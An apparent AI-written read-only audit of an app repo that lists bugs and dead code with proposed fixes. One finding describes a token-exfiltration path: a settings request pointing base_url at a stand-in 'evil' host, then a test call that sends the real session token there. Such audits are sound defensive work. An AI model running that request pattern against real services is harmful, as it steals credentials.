# Repo audit — bugs + trash (2026-08-13)

Read-only sweep of the whole repo (backend, frontend, desktop, hygiene) by two
review passes plus session knowledge. **Nothing deleted or changed** — this is
the review list. Tests currently: **395 passed**. Git working tree clean;
**no generated artifact is tracked** (static bundles, dist, target, *.db,
__pycache__ all correctly ignored).

Mark each item keep / fix / delete and I'll do them in batches.

---

## BUGS

### High

- **[B1] Token-exfiltration surface: unauthenticated settings write + CORS `*` + `0.0.0.0`.**
  `app/main.py:32` sets `allow_origins=["*"], allow_credentials=True`; no route
  has auth. Anyone who can reach the port can `PUT /api/settings {"bo":{"base_url":"https://evil"}}`
  then `POST /api/settings/test/bo`, and `bo_client._headers()` sends
  `Cookie: INTTOKEN=<real token>` to that host (token comes from the
  env/file fallback). Dockerfile runs `--host 0.0.0.0`, so this is LAN-reachable.
  → Bind to localhost by default, drop `allow_credentials`/wildcard, and/or
  refuse a DB-overridden `bo_base_url` when the token is env-sourced.

- **[B2] `decisions._num()` mis-parses US-style "1,234.56" → wrong amount in the §840 letter.**
  `app/decisions.py:155`. `"1,234.56"` → `1.23456`. Feeds `[Seized amount]`.
  A correct parser already exists (`formatting.parse_decimal`, whose docstring
  literally documents this bug class as fixed). → Replace `_num` body with
  `parse_decimal`.

### Medium

- **[B3] `trace.py` leaks names / amounts / addresses despite "safe to share" claim.**
  `app/trace.py` includes `business_name`, candidate names+regNumbers,
  `available_eur`/`held_eur`, the full `amount` dict, and `reasons` (which quote
  debtor/account names and full addresses). `scripts/case_debug.py` advertises
  the output as "no names, no IBANs, no amounts — safe to share". → Either redact
  for real, or fix the docstring + case_debug claim. (Do this before anyone
  pastes a trace into a ticket.)

- **[B4] LLM compose wasted (paid) + always falls back for non-T2 templates with seizures.**
  `pipeline.py:333` builds `comments` from all seizures unconditionally, but only
  T2 has a `[Comment]` slot; the bullet-count guard then rejects every non-T2
  compose that had seizures (S3/T6, S6A/T10, INSOLVENCY, RFI) → silent LLM
  roundtrip then deterministic fallback. Same in manual mode. → Pass `comments`
  only when `"[Comment]" in template_body`.

- **[B5-FE] Recompose race → stale or WRONG-CASE document (highest-impact FE bug).**
  `Home.jsx:128`. The 500ms debounce serializes timers, not requests. Two
  effects: (a) out-of-order compose responses overwrite newer output; (b) a
  compose in flight when a pipeline re-run / new fetch lands patches the **new
  case's** result with the **old case's** composed document — silent wrong
  document. → Add a monotonic request-id; ignore responses that aren't the latest
  / whose case changed. (One counter fixes this and half of B6-FE.)

- **[B6-FE] `tracked()` breaks with two concurrent ops: chip vanishes then sticks forever + interval leak.**
  `Home.jsx:62`. Single shared `stageTimer` ref; first op to finish clears the
  other's interval and hides its chip, while the finished op's orphaned interval
  keeps firing (permanent stale "working" chip). → Per-invocation timers + an
  in-flight counter; `setWorking(null)` only at zero.

- **[B7-FE] Per-seizure "amount €" input is a dead control.**
  `DecisionPanel.jsx:185` sends row `amount`, but compose ignores it (uses
  `description_de` + `seizable_eur`). Editing a competing seizure's amount
  recomposes with no change — misleading in a legal letter. → Either wire row
  amounts into the T2 bullets or remove the input.

- **[B8] Cross-request workspace race.** `workspaces.py` widens BO
  `activeContexts` (server-side per-user state) and restores in `finally`; two
  concurrent pipeline runs interleave and one narrows the context mid-flight for
  the other, which then silently misses a workspace. → Serialize pipeline runs
  with a lock.

### Low

- **[B9] `validate_decisions(auto)` param never used** (`decisions.py:170`). Drop it, or use it for the manual-vs-auto hint.
- **[B10] `build_manual(declaration=...)` param never used** (`decisions.py:96`). Drop it.
- **[B11] All-invalid candidate list gets resurrected.** `matching.py:614` `cand_uuids = valid or cand_uuids` — if every ticket UUID 404s, the "ignored" UUIDs are restored and offered as picker candidates anyway. → Fall through to search instead.
- **[B12] Misleading name-gate reason when a Company matches on DOB.** `matching.py:885` emits "name could not be matched" even when the name DID match and only DOB is the (non-Company) signal. → Split the reason.
- **[B13] `seized_iban_source` mislabeled.** Parser computes `provided|debtor_list` but the pipeline drops it and matching re-derives it as always "provided" (`parser.py:376`, `matching.py:801`). → Thread the parser value through.
- **[B14] `_account_item` fallback can raise past matching's contract.** `matching.py:279` uncaught `cstools_search` after a UUID is already resolved → pipeline reports "identification failed" and discards the resolved UUID. → Catch + degrade.
- **[B15] Webhook secret via query string + non-constant-time compare** (`routers/webhook.py:37`). → Header-only + `hmac.compare_digest`. (Tie to B18 decision.)
- **[B16] `created` compared as raw strings** in junior-filter/own-case ordering (`checks.py:306`, `amounts.py:32`). Safe for uniform ISO, but BO is documented elsewhere to sometimes return epoch-ms. → Normalize via `iso_date_any` before comparing.
- **[B17-FE] Regen-notice false positive + silent miss.** `DeclarationEditor.jsx:187` isn't keyed per case → shows "your edits were replaced" after switching cases; and a recompose returning identical text silently wipes hand-edits; every recompose also kicks you out of the Edit tab. → Key the editor by case; derive notice from a dirty flag.
- **[B18-FE] Nav to Settings destroys the in-progress case** (`App.jsx:35`, unmounts Home). → Keep Home mounted (CSS-hide) or lift state.
- **[B19-FE] Toast auto-dismiss timer restarts every re-render** (`Toast.jsx:5`, deps include inline `onClose`) → toasts linger during stage cycling. → deps `[message]`.
- **[B20] Minor shape nits:** `held_eur=0.0` renders `held_eur_de=None` (`checks.py:398`); `edited_fields` leaks into `manual.context.fields` (`decisions.py:73` `_META_FIELD_KEYS`); duplicated field lines keep only the last (`parser.py:224`); pinning an *empty* subject silently reverts to auto (`decisions.py:254`).

### Verified & refuted (checked, no fix needed)
Pipeline result shape is complete incl. `manual` on every return path (B15-seed). No stale-subject leak in compose (B16-seed). INTTOKEN never reaches logs/errors; anchor guard can't be bypassed; no XSS / no `dangerouslySetInnerHTML` (clipboard HTML is escaped). `wallets_error` can't mis-report as zero balance. Token file is genuinely re-read per request. api.js payloads match backend models. Favicons + `npm run deploy` copy flow correct; no hardcoded hosts/ports (sidecar-safe). WorkBar first-mount is harmless. FieldTable edits survive recompose correctly. DecisionPanel index-based role diff is safe (rows can't reorder).

---

## TRASH / DEAD CODE

### Safe to delete
- **[T1]** `schemas.py`: `BigiNotFound` (61), `OWN_CASE_SCENARIOS` (107), `is_scenario()` (112) — zero references.
- **[T2]** Dead params: `validate_decisions(auto)` and `build_manual(declaration)` (same as B9/B10).
- **[T3]** Dead imports (pyflakes): `scripts/seizure_probe.py:17` json; `tests/conftest.py:9,14`; `tests/test_llm.py:6,8`; `tests/test_scenarios.py:9`; `tests/test_pipeline.py:15`.
- **[T4]** 4 dead CSS classes (mini leftovers): `.section-title`, `.faint`, `.save-bar`, `.scroll-x` in `frontend/src/styles.css`.
- **[T5]** Two inert `eslint-disable` comments in frontend/src with no ESLint configured — either add ESLint or drop the comments.

### Needs decision
- **[T6]** `desktop/src-tauri/icons/android` + `ios` — 35 files ≈ 1.8 MB of mobile icons in a desktop-only app; regenerable from `desktop/icon-source.png` via `npx tauri icon`. Largest dead weight in a 4.9 MB repo. Delete?
- **[T7]** `POST /api/webhook/jira` — the only backend route with no in-repo consumer. If no external Jira automation posts to it, the route + `jira_webhook_secret` + `description_from_webhook` + `tests/test_webhook.py` + B15/B18 concerns all go away together. Keep (planned automation) or delete?
- **[T8]** App-dead but test-only helpers: `jira.extract_match_uuids` (live path uses `extract_match_uuid_tiers`), `settings_store.get`, `parser.norm_reg` (matching has its own). Keep as public API or delete with their tests?
- **[T9]** `schemas.SCENARIOS` — only used by the totality test. Keep if you value that test.
- **[T10]** `scripts/` diagnostics (`bo_probe.py`, `bo_mcp.py`, `seizure_probe.py`, `case_debug.py`) — no in-repo references; operator tools. Keep, but `bo_mcp.py:18` still documents the **old** `Gitlab/feizure/bigi` path (stale since the move) — fix regardless.
- **[T11]** `requirements.txt` ships `pytest>=8.0` into the production Docker image. → Split `requirements-dev.txt`. (Also: Docker base `python:3.13-slim` vs local venv 3.14 — align sometime.)

### Stale text (cosmetic, fix regardless)
- **[T12]** `backend/scripts/bo_mcp.py:18-19` — old parent-repo path in the MCP-config docstring.
- **[T13]** `frontend/src/styles.css:1` — header still `/* mini — "Ledger" dark theme */`.
- **[T14]** `README.md` — accurate but missing two lines: **manual mode** and `npm run deploy` for single-process local runs.
- **[T15]** `.gitignore` ignores `.env`/`.env.local`; `.dockerignore` ignores `.env.*` — align to `.env.*`.
- **[T16]** `desktop/build-mac.sh:18` runs `npm run build` without `npm install` — fails on a fresh clone (CI + ps1 both install). Add the install step.

### Refactor opportunities (not deletions)
Duplicated `walk()` in `_cdd_person_names` vs `_cdd_param_value`; the picker `current = {...}` dict built verbatim 3× in matching.py; `norm_reg` defined twice; `_row` vs `_settling_row` near-twin shapes. Low priority.

### Hygiene — verified clean
No generated trees tracked in git. README/Dockerfile/Windows-workflow all valid for the current layout. `desktop/ui/` is a deliberate splash page, not a stale build — keep. No leftover *files* from the "mini"/"feizure" parent (only lineage comments). spec/templates_de.md is byte-identical to the feizure copy (drift risk only).
